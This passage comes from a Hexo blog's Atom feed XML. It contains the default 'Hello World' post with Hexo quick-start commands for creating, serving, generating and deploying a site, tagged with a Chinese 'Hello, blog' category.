Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/writing.html">Writing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Run-server">          <a href="#Run-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/server.html">Server</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Generate-static-files">          <a href="#Generate-static-files" class="heading-link"><i class="fas fa-link"></i></a><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/generating.html">Generating</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Deploy-to-remote-sites">          <a href="#Deploy-to-remote-sites" class="heading-link"><i class="fas fa-link"></i></a><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;span class=&quot;exturl&quot;&gt;&lt;a class=&quot;exturl__link&quot; href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;&lt;span class=&quot;exturl__icon&quot;&gt;&lt;i class=&quot;fas fa-exter</summary>
      
    
    
    
    <category term="你好，博客" scheme="http://example.com/categories/%E4%BD%A0%E5%A5%BD%EF%BC%8C%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="你好，博客" scheme="http://example.com/tags/%E4%BD%A0%E5%A5%BD%EF%BC%8C%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/03/01/hello-world/"/>
    <id>http://example.com/2021/03/01/hello-world/</id>
    <published>2021-02-28T16:37:14.014Z</published>
    <updated>2021-03-26T17:09:20.483Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <span class="exturl"><a class="exturl__link" href="https://hexo.io/">Hexo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>! This is your very first post. Check <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/">documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or you can ask me on <span class="exturl"><a class="exturl__link" href="https://github.com/hexojs/hexo/issues">GitHub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>        <h2 id="Quick-Start">          <a href="#Quick-Start" class="heading-link"><i class="fas fa-link"></i></a><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2>              <h3 id="Create-a-new-post">          <a href="#Create-a-new-post" class="heading-link"><i class="fas fa-link"></i></a><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/writing.html">Writing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Run-server">          <a href="#Run-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/server.html">Server</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Generate-static-files">          <a href="#Generate-static-files" class="heading-link"><i class="fas fa-link"></i></a><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/generating.html">Generating</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="Deploy-to-remote-sites">          <a href="#Deploy-to-remote-sites" class="heading-link"><i class="fas fa-link"></i></a><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></div></figure><p>More info: <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;span class=&quot;exturl&quot;&gt;&lt;a class=&quot;exturl__link&quot; href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;&lt;span class=&quot;exturl__icon&quot;&gt;&lt;i class=&quot;fas fa-exter</summary>
      
    
    
    
    <category term="你好，博客" scheme="http://example.com/categories/%E4%BD%A0%E5%A5%BD%EF%BC%8C%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="你好，博客" scheme="http://example.com/tags/%E4%BD%A0%E5%A5%BD%EF%BC%8C%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
</feed>
